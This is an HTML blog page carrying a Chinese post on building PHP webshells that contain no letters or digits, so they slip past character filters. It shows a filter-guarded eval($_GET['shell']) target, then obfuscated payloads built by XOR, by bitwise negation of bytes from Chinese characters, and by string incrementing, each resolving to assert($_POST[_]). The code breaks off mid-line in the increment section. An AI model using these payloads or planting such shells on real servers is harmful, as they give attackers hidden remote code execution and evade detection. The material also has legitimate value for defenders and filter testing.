@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='php5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。 但php7中，asser'><title>离谱与webshell</title>
+
+<link rel='canonical' href='https://proben1.github.io/2022/%E7%A6%BB%E8%B0%B1%E4%B8%8Ewebshell/'>
+
+<link rel="stylesheet" href="/scss/style.min.ddb7a2bc30312e4584c50c2205f5488bbcb69c747900d22926b3f0be637b190f.css"><meta property='og:title' content='离谱与webshell'>
+<meta property='og:description' content='php5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。 但php7中，asser'>
+<meta property='og:url' content='https://proben1.github.io/2022/%E7%A6%BB%E8%B0%B1%E4%B8%8Ewebshell/'>
+<meta property='og:site_name' content='茄子的养殖场'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='php' /><meta property='article:tag' content='' /><meta property='article:published_time' content='2022-05-12T20:53:12&#43;08:00'/><meta property='article:modified_time' content='2022-05-12T20:53:12&#43;08:00'/>
+<meta name="twitter:title" content="离谱与webshell">
+<meta name="twitter:description" content="php5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。 但php7中，asser"><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://proben1.github.io/" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>Back</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu5f6318bf2277bd145affa4ac152aafed_74595_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">茄子的养殖场</a></h1>
+        <h2 class="site-description">完成一个名为大学的作品</h2><ol class="social-menu">
+                
+                    <li>
+                        <a 
+                            href='https://github.com/ProbeN1'
+                            target="_blank"
+                            title="GitHub"
+                        >
+                            
+                            
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                            
+                        </a>
+                    </li>
+                
+            </ol></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E%E6%88%91/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于我</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                网络安全
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2022/%E7%A6%BB%E8%B0%B1%E4%B8%8Ewebshell/">离谱与webshell</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 12, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    2130字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>php5中assert是一个函数，我们可以通过<code>$f='assert';$f(...);</code>这样的方法来动态执行任意代码。</p>
+<p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码.但也不是不行,也有其他的方法,比如file_put_contents这些函数</p>
+<p>所以这些都是用php5里的assert(),但是可以为php7.x版本提供思路</p>
+<p>下面,pass it!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#39;/[a-z0-9]/is&#39;</span>,<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;shell&#39;</span>])) {
+  <span style="color:#ff79c6">eval</span>(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;shell&#39;</span>]);
+}
+</code></pre></div><h2 id="异或">异或</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span>(<span style="color:#f1fa8c">&#39;%01&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%13&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%13&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%05&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%12&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%14&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>); <span style="color:#6272a4">// $_=&#39;assert&#39;;
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;_&#39;</span><span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%0D&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;]&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%2F&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;`&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%0E&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;]&#39;</span>)<span style="color:#ff79c6">.</span>(<span style="color:#f1fa8c">&#39;%09&#39;</span><span style="color:#ff79c6">^</span><span style="color:#f1fa8c">&#39;]&#39;</span>); <span style="color:#6272a4">// $__=&#39;_POST&#39;;
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$$__</span>;
+<span style="color:#8be9fd;font-style:italic">$_</span>(<span style="color:#8be9fd;font-style:italic">$___</span>[_]); <span style="color:#6272a4">// assert($_POST[_]);
+</span></code></pre></div><h2 id="取反">取反</h2>
+<p>UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code></p>
+<p>弱类型，true的值为1，故<code>true+true==2</code>，也就是<code>('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span>(<span style="color:#f1fa8c">&#39;&gt;&#39;</span><span style="color:#ff79c6">&gt;</span><span style="color:#f1fa8c">&#39;&lt;&#39;</span>)<span style="color:#ff79c6">+</span>(<span style="color:#f1fa8c">&#39;&gt;&#39;</span><span style="color:#ff79c6">&gt;</span><span style="color:#f1fa8c">&#39;&lt;&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+
+<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>;
+<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;瞰&#34;</span>;<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$_</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;和&#34;</span>;<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$__</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;和&#34;</span>;<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$__</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;的&#34;</span>;<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$_</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;半&#34;</span>;<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$_</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;始&#34;</span>;<span style="color:#8be9fd;font-style:italic">$____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$__</span>});
+
+<span style="color:#8be9fd;font-style:italic">$_____</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;_&#39;</span>;<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;俯&#34;</span>;<span style="color:#8be9fd;font-style:italic">$_____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$__</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;瞰&#34;</span>;<span style="color:#8be9fd;font-style:italic">$_____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$__</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;次&#34;</span>;<span style="color:#8be9fd;font-style:italic">$_____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$_</span>});<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;站&#34;</span>;<span style="color:#8be9fd;font-style:italic">$_____</span><span style="color:#ff79c6">.=~</span>(<span style="color:#8be9fd;font-style:italic">$___</span>{<span style="color:#8be9fd;font-style:italic">$_</span>});
+
+<span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$$_____</span>;
+<span style="color:#8be9fd;font-style:italic">$____</span>(<span style="color:#8be9fd;font-style:italic">$_</span>[<span style="color:#8be9fd;font-style:italic">$__</span>]);
+</code></pre></div><p>寻找思路:找一篇长点的文章,写个脚本把里面的字挨个试一下,看通过截取并取反这个过程能不能得到字母</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+error_reporting(<span style="color:#bd93f9">0</span>);
+header(<span style="color:#f1fa8c">&#39;Content-Type: text/html; charset=utf-8&#39;</span>);
+
+<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">str_split_unicode</span>(<span style="color:#8be9fd;font-style:italic">$str</span>, <span style="color:#8be9fd;font-style:italic">$l</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>) {
+
+    <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$l</span> <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) {
+        <span style="color:#8be9fd;font-style:italic">$ret</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">array</span>();
+        <span style="color:#8be9fd;font-style:italic">$len</span> <span style="color:#ff79c6">=</span> mb_strlen(<span style="color:#8be9fd;font-style:italic">$str</span>, <span style="color:#f1fa8c">&#34;UTF-8&#34;</span>);
+        <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> <span style="color:#8be9fd;font-style:italic">$len</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">$l</span>) {
+            <span style="color:#8be9fd;font-style:italic">$ret</span>[] <span style="color:#ff79c6">=</span> mb_substr(<span style="color:#8be9fd;font-style:italic">$str</span>, <span style="color:#8be9fd;font-style:italic">$i</span>, <span style="color:#8be9fd;font-style:italic">$l</span>, <span style="color:#f1fa8c">&#34;UTF-8&#34;</span>);
+        }
+        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$ret</span>;
+    }
+    <span style="color:#ff79c6">return</span> preg_split(<span style="color:#f1fa8c">&#34;//u&#34;</span>, <span style="color:#8be9fd;font-style:italic">$str</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, PREG_SPLIT_NO_EMPTY);
+}
+
+<span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之&#39;</span>;
+
+<span style="color:#8be9fd;font-style:italic">$arr_str</span><span style="color:#ff79c6">=</span>str_split_unicode(<span style="color:#8be9fd;font-style:italic">$s</span>);
+
+<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> strlen(<span style="color:#8be9fd;font-style:italic">$s</span>) ; <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">++</span>) {
+	<span style="color:#ff79c6">echo</span> <span style="color:#8be9fd;font-style:italic">$arr_str</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;--&gt;&#39;</span><span style="color:#ff79c6">.~</span><span style="color:#8be9fd;font-style:italic">$arr_str</span>[<span style="color:#8be9fd;font-style:italic">$i</span>]{<span style="color:#bd93f9">1</span>}<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&lt;br&gt;&#39;</span>;
+}
+ <span style="color:#ff79c6">?&gt;</span>
+</code></pre></div><h2 id="递增递减">递增／递减</h2>
+<p>PHP 支持 C 风格的前／后递增与递减运算符。</p>
+<p>所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
+<p>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p>
+<p>如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p>
+<p><figure 
+	>
+	<a href="https://pic.imgdb.cn/item/617a34752ab3f51d91b97c7a.jpg#alt=" >
+		<img src="https://pic.imgdb.cn/item/617a34752ab3f51d91b97c7a.jpg#alt="
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span>[];
+<span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=@</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">$_</span><span style="color:#f1fa8c">&#34;</span>; <span style="color:#6272a4">// $_=&#39;Array&#39;;
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>[<span style="color:#f1fa8c">&#39;!&#39;</span><span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;@&#39;</span>]; <span style="color:#6272a4">// $_=$_[0];
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>; <span style="color:#6272a4">// A
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;
+<span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>; <span style="color:#6272a4">// S
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>; <span style="color:#6272a4">// S
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>; <span style="color:#6272a4">// E 
+</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$___</span><span style="color:#ff79c6">.=</span><span style="color:#8be9fd;font-style:italic">$__</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">$_</span>;
+<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span style="color:#ff79c6">++</span>;<span style="color:#8be9fd;font-style:italic">$__</span><span 